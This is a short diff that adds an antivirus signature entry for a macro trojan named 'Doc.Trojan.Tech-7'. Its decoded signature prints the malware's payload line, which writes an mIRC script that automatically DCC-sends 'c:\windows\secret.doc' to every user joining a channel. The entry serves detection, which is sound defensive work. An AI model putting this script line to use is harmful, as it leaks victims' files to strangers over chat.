@@ -1,0 +1,5 @@
+VIRUS NAME: Doc.Trojan.Tech-7
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+Print #1, "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick 'c:\windows\secret.doc' } | .disable #d | .timer 1 60 .enable #d }"
